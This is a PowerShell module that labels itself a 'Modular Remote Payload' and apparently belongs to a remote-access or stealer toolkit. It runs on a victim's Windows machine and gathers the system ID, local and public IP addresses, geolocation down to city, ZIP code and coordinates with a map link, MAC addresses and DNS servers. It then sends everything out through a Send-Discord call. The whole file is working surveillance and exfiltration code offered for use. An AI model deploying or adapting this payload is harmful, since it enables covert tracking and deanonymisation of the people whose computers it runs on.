# ============================================================
# IP Information Grabber - Modular Remote Payload
# ============================================================
# Gets IP addresses and geolocation info
# ============================================================

$sysid = Get-SystemID
$output = "🌍 **IP Info from $sysid**`n"
$output += "📅 " + (Get-Date -Format "yyyy-MM-dd HH:mm:ss") + "`n"
$output += "=" * 40 + "`n`n"

# Local IPs
$output += "**📍 LOCAL IPs**`n"
$adapters = Get-NetIPAddress -AddressFamily IPv4 | Where-Object { 
    $_.InterfaceAlias -notlike '*Loopback*' -and $_.IPAddress -notlike '169.*'
}
foreach ($a in $adapters) {
    $output += "• $($a.InterfaceAlias): ``$($a.IPAddress)```n"
}
$output += "`n"

# Public IP with geolocation
$output += "**🌐 PUBLIC IP**`n"
try {
    $geo = Invoke-RestMethod -Uri "http://ip-api.com/json/" -TimeoutSec 10
    $output += "• IP: ``$($geo.query)```n"
    $output += "• Country: ``$($geo.country) ($($geo.countryCode))```n"
    $output += "• Region: ``$($geo.regionName)```n"
    $output += "• City: ``$($geo.city)```n"
    $output += "• ZIP: ``$($geo.zip)```n"
    $output += "• ISP: ``$($geo.isp)```n"
    $output += "• Org: ``$($geo.org)```n"
    $output += "• Timezone: ``$($geo.timezone)```n"
    $output += "• Coords: ``$($geo.lat), $($geo.lon)```n"
    
    # Google Maps link
    $output += "`n📍 [View on Map](https://www.google.com/maps?q=$($geo.lat),$($geo.lon))`n"
} catch {
    try {
        $pubIP = Invoke-RestMethod -Uri "https://api.ipify.org" -TimeoutSec 5
        $output += "• IP: ``$pubIP```n"
    } catch {
        $output += "• Could not fetch public IP`n"
    }
}

# MAC addresses
$output += "`n**🔌 MAC ADDRESSES**`n"
$macs = Get-NetAdapter | Where-Object { $_.Status -eq 'Up' }
foreach ($m in $macs) {
    $output += "• $($m.Name): ``$($m.MacAddress)```n"
}

# DNS servers
$output += "`n**🔎 DNS SERVERS**`n"
$dns = Get-DnsClientServerAddress -AddressFamily IPv4 | Where-Object { $_.ServerAddresses }
foreach ($d in $dns | Select-Object -First 3) {
    $output += "• $($d.InterfaceAlias): ``$($d.ServerAddresses -join ', ')```n"
}

Send-Discord $output

